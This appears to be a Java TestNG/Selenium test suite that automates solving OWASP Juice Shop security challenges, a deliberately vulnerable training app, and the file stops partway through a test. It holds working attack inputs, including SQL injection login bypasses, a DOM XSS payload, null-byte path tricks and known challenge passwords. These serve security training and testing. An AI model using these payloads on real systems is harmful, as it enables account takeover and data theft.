
package tests.JuiceShop;

import automation.ZapManager;
import org.openqa.selenium.Alert;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;
import org.testng.Assert;
import org.testng.SkipException;
import org.testng.annotations.BeforeMethod;
import org.testng.annotations.Test;
import pom.JuiceShop.AdministrationPage;
import pom.JuiceShop.LoginPage;
import pom.JuiceShop.PrivacyPolicyPage;
import pom.JuiceShop.ResourcePage;
import pom.JuiceShop.ScoreBoardPage;
import pom.JuiceShop.SearchPage;
import utilities.JuiceShop.JuiceShopApi;
import utilities.JuiceShop.JuiceShopChallengeActions;
import utilities.ScreenshotManager;

import java.net.URI;
import java.time.Duration;

public class JuiceShopChallengesTest extends JuiceShopBaseTest {

    private JuiceShopApi api;
    private JuiceShopChallengeActions actions;

    @BeforeMethod
    public void prepareChallengeUtilities() {
        api = new JuiceShopApi(baseUrl);
        actions = new JuiceShopChallengeActions(api);
    }

    @Test(priority = 1)
    public void testSqlInjectionLoginBypass() {
        var driver = ZapManager.getDriver();
        LoginPage loginPage = new LoginPage(driver);
        loginPage.loginFromHome(baseUrl, "admin@juice-sh.op'--", "anything");

        ScreenshotManager.capture(driver);
        Assert.assertTrue(loginPage.isUserLoggedIn(), "SQL Injection authentication bypass failed: user is not logged in.");
    }

    @Test(priority = 2)
    public void testDomXssChallenge() {
        var driver = ZapManager.getDriver();
        SearchPage searchPage = new SearchPage(driver);
        searchPage.searchFromHome(baseUrl, "<iframe src=\"javascript:alert(`xss`)\">");

        Alert alert = new WebDriverWait(driver, Duration.ofSeconds(10)).until(ExpectedConditions.alertIsPresent());
        Assert.assertEquals(alert.getText(), "xss", "DOM XSS payload did not execute correctly.");
        alert.accept();

        ScreenshotManager.capture(driver);
        System.out.println("DOM XSS payload executed successfully.");
    }

    @Test(priority = 3)
    public void testConfidentialDocumentChallenge() throws Exception {
        var response = api.get("/ftp/acquisitions.md");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);

        Assert.assertEquals(response.statusCode(), 200, "Confidential document was not accessible.");
        Assert.assertFalse(response.body().isBlank(), "Confidential document was empty.");
        assertChallengeSolved("Confidential Document");
    }

    @Test(priority = 4)
    public void testExposedMetricsChallenge() throws Exception {
        var response = api.get("/metrics");
        System.out.println("Metrics status: " + response.statusCode());
        System.out.println("Metrics URL: " + response.request().uri());
        Assert.assertEquals(response.statusCode(), 200);
        Assert.assertTrue(response.body().contains("# HELP"));

        var driver = ZapManager.getDriver();
        new ScoreBoardPage(driver).open(baseUrl);
        ScreenshotManager.capture(driver);
        assertChallengeSolved("Exposed Metrics");
    }

    @Test(priority = 5)
    public void testAdminSectionChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        new LoginPage(driver).loginFromHome(baseUrl, "admin@juice-sh.op'--", "anything");
        new AdministrationPage(driver).open(baseUrl);

        ScreenshotManager.capture(driver);
        assertChallengeSolved("Admin Section");
    }

    @Test(priority = 6)
    public void testSecurityPolicyChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        ResourcePage resource = new ResourcePage(driver);
        resource.open(URI.create(baseUrl).resolve("/.well-known/security.txt").toString());
        Assert.assertTrue(resource.bodyText().contains("Contact:"), "Security policy was not retrieved.");

        ScreenshotManager.capture(driver);
        assertChallengeSolved("Security Policy");
    }

    @Test(priority = 7)
    public void testMissingEncodingChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        String path = "/assets/public/images/uploads/" +
                "%E1%93%9A%E1%98%8F%E1%97%A2-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg";
        new ResourcePage(driver).open(URI.create(baseUrl).resolve(path).toString());
        Assert.assertTrue(driver.getCurrentUrl().contains("%23zatschi"), "Encoded image request was not made.");

        ScreenshotManager.capture(driver);
        assertChallengeSolved("Missing Encoding");
    }

    @Test(priority = 8)
    public void testExtraLanguageChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        new ResourcePage(driver).open(URI.create(baseUrl).resolve("/assets/i18n/tlh_AA.json").toString());

        ScreenshotManager.capture(driver);
        assertChallengeSolved("Extra Language");
    }

    @Test(priority = 9)
    public void testPrivacyPolicyChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        new PrivacyPolicyPage(driver).open(baseUrl);

        ScreenshotManager.capture(driver);
        assertChallengeSolved("Privacy Policy");
    }

    @Test(priority = 11)
    public void testErrorHandlingChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        ResourcePage resource = new ResourcePage(driver);
        resource.open(URI.create(baseUrl).resolve("/rest/products/search?q=%27%3B").toString());
        resource.waitForBodyText("SQLITE_ERROR", 10);

        ScreenshotManager.capture(driver);
        assertChallengeSolved("Error Handling");
    }

    @Test(priority = 12)
    public void testPasswordStrengthChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        LoginPage loginPage = new LoginPage(driver);
        loginPage.loginFromHome(baseUrl, "admin@juice-sh.op", "admin123");
        Assert.assertTrue(loginPage.isUserLoggedIn(), "Administrator login failed.");

        ScreenshotManager.capture(driver);
        assertChallengeSolved("Password Strength");
    }

    @Test(priority = 13)
    public void testLoginBenderChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        LoginPage loginPage = new LoginPage(driver);
        loginPage.loginFromHome(baseUrl, "bender@juice-sh.op'--", "anything");
        Assert.assertTrue(loginPage.isUserLoggedIn(), "Bender login bypass failed.");

        ScreenshotManager.capture(driver);
        assertChallengeSolved("Login Bender");
    }

    @Test(priority = 14)
    public void testLoginJimChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        LoginPage loginPage = new LoginPage(driver);
        loginPage.loginFromHome(baseUrl, "jim@juice-sh.op'--", "anything");
        Assert.assertTrue(loginPage.isUserLoggedIn(), "Jim login bypass failed.");

        ScreenshotManager.capture(driver);
        assertChallengeSolved("Login Jim");
    }

    @Test(priority = 15)
    public void testAccessLogChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        ResourcePage resource = new ResourcePage(driver);
        resource.open(baseUrl + "/support/logs/");
        String logUrl = resource.findLinkContaining("access.log", 15);
        Assert.assertNotNull(logUrl, "No access log link was found.");

        ScreenshotManager.capture(driver);
        resource.open(logUrl);
        assertChallengeSolved("Access Log");
    }

    @Test(priority = 16)
    public void testMisplacedIaCFilesChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        ResourcePage resource = new ResourcePage(driver);
        resource.open(baseUrl + "/infrastructure/terraform/main.tf");
        resource.waitForBodyText("provider", 15);
        Assert.assertTrue(resource.bodyText().contains("resource"), "Terraform configuration was not exposed.");

        ScreenshotManager.capture(driver);
        assertChallengeSolved("Misplaced IaC Files");
    }

    @Test(priority = 17)
    public void testBonusPayloadChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        SearchPage searchPage = new SearchPage(driver);
        String payload = "<iframe width=\"100%\" height=\"166\" scrolling=\"no\" frameborder=\"no\" allow=\"autoplay\" "
                + "src=\"https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076"
                + "&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true"
                + "&show_reposts=false&show_teaser=true\"></iframe>";

        searchPage.searchFromHome(baseUrl, payload);
        searchPage.waitForSoundCloudPlayer();

        ScreenshotManager.capture(driver);
        assertChallengeSolved("Bonus Payload");
    }

    @Test(priority = 18)
    public void testEasterEggChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        ResourcePage ftp = new ResourcePage(driver);
        ftp.open(baseUrl + "/ftp/");
        ftp.findLinkContaining("eastere.gg", 15);

        var response = api.get("/ftp/eastere.gg%2500.md");
        Assert.assertEquals(response.statusCode(), 200, "Easter Egg file was not accessible.");

        ScreenshotManager.captureResponse(driver, response);
        assertChallengeSolved("Easter Egg");
    }

    @Test(priority = 19)
    public void testPoisonNullByteChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        ResourcePage ftp = new ResourcePage(driver);
        ftp.open(baseUrl + "/ftp/");
        ftp.findLinkContaining("package.json.bak", 15);

        var response = api.get("/ftp/package.json.bak%2500.md");
        System.out.println("[POISON NULL BYTE] Content type: " + response.headers().firstValue("content-type").orElse("unknown"));
        System.out.println("[POISON NULL BYTE] Response length: " + response.body().length());
        Assert.assertEquals(response.statusCode(), 200, "Developer backup request did not return HTTP 200.");

        ScreenshotManager.captureResponse(driver, response);
        assertChallengeSolved("Forgotten Developer Backup");
        assertChallengeSolved("Poison Null Byte");
    }

    @Test(priority = 20)
    public void testForgottenSalesBackupChallenge() throws Exception {
        var response = api.get("/ftp/coupons_2013.md.bak%2500.pdf");
        Assert.assertEquals(response.statusCode(), 200, "Sales backup was not accessible.");

        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Forgotten Sales Backup");
    }

    @Test(priority = 21)
    public void testMisplacedSignatureFileChallenge() throws Exception {
        var response = api.get("/ftp/suspicious_errors.yml%2500.md");
        Assert.assertEquals(response.statusCode(), 200, "SIEM signature file was not accessible.");

        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Misplaced Signature File");
    }

    @Test(priority = 22)
    public void testOutdatedAllowlistChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        String destination = "https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm";
        var response = api.get("/redirect?to=" + destination);
        String location = response.headers().firstValue("location").orElse("");
        Assert.assertEquals(response.statusCode(), 302, "Expected a redirect response.");
        Assert.assertEquals(location, destination, "Unexpected redirect destination.");

        ScreenshotManager.captureResponse(driver, response);
        assertChallengeSolved("Outdated Allowlist");
    }

    @Test(priority = 23)
    public void testPrivacyPolicyInspectionChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl + "/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility");
        assertChallengeSolved("Privacy Policy Inspection");

        boolean imageAvailable = false;
        try {
            var response = api.get("/assets/private/thank-you.jpg");
            String contentType = response.headers().firstValue("Content-Type").orElse("");
            imageAvailable = response.statusCode() == 200 && contentType.toLowerCase().startsWith("image/");
        } catch (Exception e) {
            System.out.println("[PRIVACY POLICY] Image request failed: " + e.getMessage());
        }

        new PrivacyPolicyPage(driver).showInspectionEvidence(baseUrl, imageAvailable);
        ScreenshotManager.capture(driver);
    }

    @Test(priority = 24)
    public void testRepetitiveRegistrationChallenge() throws Exception {
        var response = actions.registerWithMismatchedPasswords();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Repetitive Registration");
    }

    @Test(priority = 25)
    public void testEmptyUserRegistrationChallenge() throws Exception {
        var response = actions.registerEmptyUser();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Empty User Registration");
    }

    @Test(priority = 26)
    public void testViewBasketChallenge() throws Exception {
        var result = actions.viewAnotherBasket();
        System.out.println("[VIEW BASKET] Authenticated basket: " + result.ownBasketId());
        System.out.println("[VIEW BASKET] Requested basket: " + result.targetBasketId());
        Assert.assertNotEquals(result.targetBasketId(), result.ownBasketId(), "Target belongs to the authenticated user.");
        Assert.assertEquals(result.response().statusCode(), 200, "Another user's basket was not accessible.");

        ScreenshotManager.captureResponse(ZapManager.getDriver(), result.response());
        assertChallengeSolved("View Basket");
    }

    @Test(priority = 27)
    public void testForgedFeedbackChallenge() throws Exception {
        var result = actions.submitForgedFeedback();
        System.out.println("[FORGED FEEDBACK] Authenticated user: " + result.authenticatedUserId());
        System.out.println("[FORGED FEEDBACK] Submitted as user: " + result.forgedUserId());
        Assert.assertNotEquals(result.forgedUserId(), result.authenticatedUserId(), "Feedback must reference another user.");
        Assert.assertEquals(result.response().statusCode(), 201, "Forged feedback was not accepted.");

        ScreenshotManager.captureResponse(ZapManager.getDriver(), result.response());
        assertChallengeSolved("Forged Feedback");
    }

    @Test(priority = 28)
    public void testFiveStarFeedbackChallenge() throws Exception {
        var result = actions.removeFiveStarFeedback();
        Assert.assertFalse(result.fiveStarsRemain(), "Five-star customer feedback still exists.");
        System.out.println("[FIVE-STAR FEEDBACK] Entries removed: " + result.deletedCount());

        ScreenshotManager.captureResponse(ZapManager.getDriver(), result.response());
        assertChallengeSolved("Five-Star Feedback");
    }

    @Test(priority = 29)
    public void testWeb3SandboxChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl + "/#/web3-sandbox");
        ScreenshotManager.capture(driver);
        assertChallengeSolved("Web3 Sandbox");
    }

    @Test(priority = 30)
    public void testAdminRegistrationChallenge() throws Exception {
        var response = actions.registerWithAdminRole();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Admin Registration");
    }

    @Test(priority = 31)
    public void testZeroStarsChallenge() throws Exception {
        var response = actions.submitZeroStarFeedback();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Zero Stars");
    }

    @Test(priority = 32)
    public void testForgedReviewChallenge() throws Exception {
        var response = actions.submitForgedProductReview();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Forged Review");
    }

    @Test(priority = 33)
    public void testLoginMcSafeSearchChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        new LoginPage(driver).loginFromHome(baseUrl, "mc.safesearch@juice-sh.op", "Mr. N00dles");
        ScreenshotManager.capture(driver);
        assertChallengeSolved("Login MC SafeSearch");
    }

    @Test(priority = 34)
    public void testLoginAmyChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        new LoginPage(driver).loginFromHome(baseUrl, "amy@juice-sh.op", "K1f.....................");
        ScreenshotManager.capture(driver);
        assertChallengeSolved("Login Amy");
    }

    @Test(priority = 35)
    public void testPasswordHashLeakChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        new LoginPage(driver).loginFromHome(baseUrl, "admin@juice-sh.op", "admin123");
        ResourcePage resource = new ResourcePage(driver);
        resource.open(baseUrl + "/rest/user/whoami?fields=password");
        ScreenshotManager.capture(driver);
        assertChallengeSolved("Password Hash Leak");
    }

    @Test(priority = 36)
    public void testEmailLeakChallenge() throws Exception {
        var response = api.get("/rest/user/whoami?callback=leak");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Email Leak");
    }

    @Test(priority = 37)
    public void testWeirdCryptoChallenge() throws Exception {
        var response = actions.submitCryptoComplaint();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Weird Crypto");
    }

    @Test(priority = 38)
    public void testVulnerableLibraryChallenge() throws Exception {
        var response = actions.submitVulnerableLibraryComplaint();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Vulnerable Library");
    }

    @Test(priority = 39)
    public void testNestedEasterEggChallenge() throws Exception {
        var response = actions.retrieveNestedEasterEgg();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertEquals(response.statusCode(), 200);
        assertChallengeSolved("Nested Easter Egg");
    }

    @Test(priority = 40)
    public void testRetrieveBlueprintChallenge() throws Exception {
        var response = actions.retrieveBlueprint();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertEquals(response.statusCode(), 200);
        assertChallengeSolved("Retrieve Blueprint");
    }

    @Test(priority = 41)
    public void testBlockchainHypeChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl + "/#/tokensale-ico-ea");
        ScreenshotManager.capture(driver);
        assertChallengeSolved("Blockchain Hype");
    }

    @Test(priority = 42)
    public void testPremiumPaywallChallenge() throws Exception {
        var response = actions.openPremiumPage();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertEquals(response.statusCode(), 200);
        assertChallengeSolved("Premium Paywall");
    }

    @Test(priority = 43)
    public void testImaginaryChallenge() throws Exception {
        var response = actions.applyImaginaryContinueCode();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Imaginary Challenge");
    }

    @Test(priority = 44)
    public void testAllowlistBypassChallenge() throws Exception {
        var response = actions.bypassRedirectAllowlist();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertEquals(response.statusCode(), 302);
        assertChallengeSolved("Allowlist Bypass");
    }

    @Test(priority = 45)
    public void testLegacyTyposquattingChallenge() throws Exception {
        var response = actions.submitFeedback("Suspect dependency: epilogue-js");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Legacy Typosquatting");
    }

    @Test(priority = 46)
    public void testFrontendTyposquattingChallenge() throws Exception {
        var response = actions.submitFeedback("Suspect frontend module: ngy-cookie");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Frontend Typosquatting");
    }

    @Test(priority = 47)
    public void testSteganographyChallenge() throws Exception {
        var response = actions.submitFeedback("The hidden character is Pickle Rick");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Steganography");
    }

    @Test(priority = 48)
    public void testSupplyChainAttackChallenge() throws Exception {
        var response = actions.submitFeedback("https://github.com/eslint/eslint-scope/issues/39");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Supply Chain Attack");
    }

    @Test(priority = 49)
    public void testLeakedUnsafeProductChallenge() throws Exception {
        var response = actions.submitFeedback("Rippertuer Special Juice contains unsafe ingredients: Eurogium Edule and Hueteroneel");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Leaked Unsafe Product");
    }

    @Test(priority = 50)
    public void testProductTamperingChallenge() throws Exception {
        var response = actions.tamperWithProductDescription();

        Assert.assertEquals(response.statusCode(), 200, "Product description update failed.");

        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        actions.waitForChallenge("Product Tampering");
        assertChallengeSolved("Product Tampering");
    }

    @Test(priority = 51)
    public void testNoSqlManipulationChallenge() throws Exception {
        var response = actions.updateAllReviewsViaNoSql();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("NoSQL Manipulation");
    }

    @Test(priority = 52)
    public void testDatabaseSchemaChallenge() throws Exception {
        var response = actions.retrieveDatabaseSchema();

        Assert.assertEquals(response.statusCode(), 200, "Database schema request failed.");
        Assert.assertTrue(response.body().contains("CREATE TABLE"),
                "Database schema was not returned.");

        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        actions.waitForChallenge("Database Schema");
        assertChallengeSolved("Database Schema");
    }

    @Test(priority = 53)
    public void testUserCredentialsChallenge() throws Exception {
        var response = actions.retrieveUserCredentials();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertEquals(response.statusCode(), 200);
        assertChallengeSolved("User Credentials");
    }

    // This test is disabled in Docker Environments
    @Test(priority = 54, enabled = false)
    public void testNoSqlExfiltrationChallenge() throws Exception {
        var response = actions.exfiltrateOrdersViaNoSql();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        if (!api.isChallengeSolved("NoSQL Exfiltration"))
            throw new SkipException("NoSQL Exfiltration is disabled in the Juice Shop Docker environment.");
        assertChallengeSolved("NoSQL Exfiltration");
    }

    @Test(priority = 55)
    public void testCaptchaBypassChallenge() throws Exception {
        var response = actions.submitRapidFeedback(12);
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("CAPTCHA Bypass");
    }

    @Test(priority = 56)
    public void testMultipleLikesChallenge() throws Exception {
        var responses = actions.likeReviewConcurrently();
        Assert.assertEquals(responses.size(), 3, "Expected three review-like requests.");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), responses.get(0));
        assertChallengeSolved("Multiple Likes");
    }

    @Test(priority = 57)
    public void testUploadTypeChallenge() throws Exception {
        var response = actions.uploadUnexpectedFileType();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Upload Type");
    }

    @Test(priority = 58)
    public void testUploadSizeChallenge() throws Exception {
        var response = actions.uploadOversizedPdf();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Upload Size");
    }

    @Test(priority = 59)
    public void testDeprecatedInterfaceChallenge() throws Exception {
        var response = actions.useDeprecatedXmlUpload();
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        assertChallengeSolved("Deprecated Interface");
    }

    @Test(priority = 61)
    public void testCrossSiteImagingChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        new LoginPage(driver).loginFromHome(baseUrl, "admin@juice-sh.op", "admin123");

        driver.get(actions.crossSiteImagingUrl(baseUrl));

        actions.waitForChallenge("Cross-Site Imaging");
        ScreenshotManager.capture(driver);
        assertChallengeSolved("Cross-Site Imaging");
    }

    @Test(priority = 62)
    public void testLoginBjoernChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        new LoginPage(driver).loginFromHome(baseUrl, "bjoern.kimminich@gmail.com", "bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=");
        ScreenshotManager.capture(driver);
        assertChallengeSolved("Login Bjoern");
    }

    @Test(priority = 63)
    public void testLoginSupportTeamChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        new LoginPage(driver).loginFromHome(baseUrl, "support@juice-sh.op", "J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P");
        ScreenshotManager.capture(driver);
        assertChallengeSolved("Login Support Team");
    }

    @Test(priority = 64)
    public void testGdprDataErasureChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        new LoginPage(driver).loginFromHome(baseUrl, "chris.pike@juice-sh.op'--", "anything");
        ScreenshotManager.capture(driver);
        assertChallengeSolved("GDPR Data Erasure");
    }

    @Test(priority = 65)
    public void testEphemeralAccountantChallenge() throws Exception {
        var driver = ZapManager.getDriver();
        new LoginPage(driver).loginFromHome(baseUrl, actions.ephemeralAccountantLogin(), "anything");
        ScreenshotManager.capture(driver);
        assertChallengeSolved("Ephemeral Accountant");
    }

    @Test(priority = 66)
    public void testLeakedApiKeyChallenge() throws Exception {
        var response = actions.submitFeedback(
                "A leaked API key was identified: 6PPi37DBxP4lDwlriuaxP15HaDJpsUXY5TspVmie"
        );

        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        actions.waitForChallenge("Leaked API Key");
        assertChallengeSolved("Leaked API Key");
    }

    @Test(priority = 67)
    public void testVulnerableInfrastructureChallenge() throws Exception {
        var response = actions.submitFeedback(
                "Security finding: The infrastructure references the vulnerable Docker image mongo:4.4.29."
        );

        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        actions.waitForChallenge("Vulnerable Infrastructure");
        assertChallengeSolved("Vulnerable Infrastructure");
    }

    @Test(priority = 68)
    public void testManipulateBasketChallenge() throws Exception {
        var response = actions.addProductToAnotherBasket();

        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertTrue(response.statusCode() == 200 || response.statusCode() == 201,
                "Basket manipulation request failed. HTTP " + response.statusCode());
        assertChallengeSolved("Manipulate Basket");
    }

    // Additional read-only and access-control regression tests for Juice Shop v20.3.0.
    // One named challenge completion test and nineteen API contract/access-control checks.

    @Test(priority = 69)
    public void testProductCatalogRead() throws Exception {
        var response = api.get("/api/Products");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertEquals(response.statusCode(), 200, "Expected public endpoint to respond successfully: /api/Products");
        Assert.assertFalse(response.body().isBlank(), "API response body was empty: testProductCatalogRead");
    }

    @Test(priority = 70)
    public void testProductDetailRead() throws Exception {
        var response = api.get("/api/Products/1");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertEquals(response.statusCode(), 200, "Expected public endpoint to respond successfully: /api/Products/1");
        Assert.assertFalse(response.body().isBlank(), "API response body was empty: testProductDetailRead");
    }

    @Test(priority = 71)
    public void testProductSearchNoMatches() throws Exception {
        var response = api.get("/rest/products/search?q=zzzznotfound9876");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertEquals(response.statusCode(), 200, "Expected public endpoint to respond successfully: /rest/products/search?q=zzzznotfound9876");
        Assert.assertFalse(response.body().isBlank(), "API response body was empty: testProductSearchNoMatches");
    }

    @Test(priority = 72)
    public void testSecurityQuestionsCatalogRead() throws Exception {
        var response = api.get("/api/SecurityQuestions");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertEquals(response.statusCode(), 200, "Expected public endpoint to respond successfully: /api/SecurityQuestions");
        Assert.assertFalse(response.body().isBlank(), "API response body was empty: testSecurityQuestionsCatalogRead");
    }

    @Test(priority = 73)
    public void testDeliveryMethodsRead() throws Exception {
        var response = api.get("/api/Deliverys");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertEquals(response.statusCode(), 200, "Expected public endpoint to respond successfully: /api/Deliverys");
        Assert.assertFalse(response.body().isBlank(), "API response body was empty: testDeliveryMethodsRead");
    }

    @Test(priority = 74)
    public void testLanguagesCatalogRead() throws Exception {
        var response = api.get("/rest/languages");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertEquals(response.statusCode(), 200, "Expected public endpoint to respond successfully: /rest/languages");
        Assert.assertFalse(response.body().isBlank(), "API response body was empty: testLanguagesCatalogRead");
    }

    @Test(priority = 75)
    public void testImageCaptchaRead() throws Exception {
        var session = api.login();
        var response = api.get("/rest/image-captcha", session.token());

        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);

        Assert.assertEquals(response.statusCode(), 200,
                "Authenticated image CAPTCHA request failed. HTTP " + response.statusCode());
        Assert.assertFalse(response.body().isBlank(), "Image CAPTCHA response was empty.");
    }

    @Test(priority = 76)
    public void testPublicMemoriesRead() throws Exception {
        var response = api.get("/rest/memories");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertEquals(response.statusCode(), 200, "Expected public endpoint to respond successfully: /rest/memories");
        Assert.assertFalse(response.body().isBlank(), "API response body was empty: testPublicMemoriesRead");
    }

    @Test(priority = 77)
    public void testApplicationVersionRead() throws Exception {
        var response = api.get("/rest/admin/application-version");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertEquals(response.statusCode(), 200, "Expected public endpoint to respond successfully: /rest/admin/application-version");
        Assert.assertFalse(response.body().isBlank(), "API response body was empty: testApplicationVersionRead");
    }

    @Test(priority = 78)
    public void testApplicationConfigurationRead() throws Exception {
        var response = api.get("/rest/admin/application-configuration");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertEquals(response.statusCode(), 200, "Expected public endpoint to respond successfully: /rest/admin/application-configuration");
        Assert.assertFalse(response.body().isBlank(), "API response body was empty: testApplicationConfigurationRead");
    }


    @Test(priority = 80)
    public void testHintCatalogRead() throws Exception {
        var response = api.get("/api/Hints");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertEquals(response.statusCode(), 200, "Expected public endpoint to respond successfully: /api/Hints");
        Assert.assertFalse(response.body().isBlank(), "API response body was empty: testHintCatalogRead");
    }

    @Test(priority = 81)
    public void testAnonymousComplaintAccessDenied() throws Exception {
        var response = api.get("/api/Complaints");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertTrue(response.statusCode() == 401 || response.statusCode() == 403, "Expected unauthorized access to be denied for /api/Complaints; HTTP " + response.statusCode());
    }

    @Test(priority = 82)
    public void testAnonymousBasketItemsAccessDenied() throws Exception {
        var response = api.get("/api/BasketItems");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertTrue(response.statusCode() == 401 || response.statusCode() == 403, "Expected unauthorized access to be denied for /api/BasketItems; HTTP " + response.statusCode());
    }

    @Test(priority = 83)
    public void testAnonymousPrivacyRequestsAccessDenied() throws Exception {
        var response = api.get("/api/PrivacyRequests");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertTrue(response.statusCode() == 401 || response.statusCode() == 403, "Expected unauthorized access to be denied for /api/PrivacyRequests; HTTP " + response.statusCode());
    }

    @Test(priority = 84)
    public void testAnonymousUsersAccessDenied() throws Exception {
        var response = api.get("/api/Users");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertTrue(response.statusCode() == 401 || response.statusCode() == 403, "Expected unauthorized access to be denied for /api/Users; HTTP " + response.statusCode());
    }

    @Test(priority = 85)
    public void testSecurityAnswersReadDenied() throws Exception {
        var response = api.get("/api/SecurityAnswers");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertTrue(response.statusCode() == 401 || response.statusCode() == 403, "Expected unauthorized access to be denied for /api/SecurityAnswers; HTTP " + response.statusCode());
    }

    @Test(priority = 86)
    public void testChallengeCreationDenied() throws Exception {
        var response = api.post("/api/Challenges", java.util.Map.of());
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertTrue(response.statusCode() == 401 || response.statusCode() == 403, "Expected unauthorized access to be denied for /api/Challenges; HTTP " + response.statusCode());
    }

    @Test(priority = 87)
    public void testSecurityAdvisoryChallenge() throws Exception {
        var response = actions.submitFeedback("Security advisory checksum: " +
                "7e7ce7c65db3bf0625fcea4573d25cff41f2f7e3474f2c74334b14fc65bb4fd26af802ad17a3a03bf0eee6827a00fb8f7905f338c31b5e6ea9cb31620242e843");
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        actions.waitForChallenge("Security Advisory");
        assertChallengeSolved("Security Advisory");
    }

    @Test(priority = 88)
    public void testInvalidPasswordRejected() throws Exception {
        var response = api.post("/rest/user/login", java.util.Map.of(
                "email", "admin@juice-sh.op", "password", "incorrect-" + System.nanoTime()));
        ScreenshotManager.captureResponse(ZapManager.getDriver(), response);
        Assert.assertEquals(response.statusCode(), 401, "Invalid credentials unexpectedly authenticated.");
    }

    @Test(priority = 89)
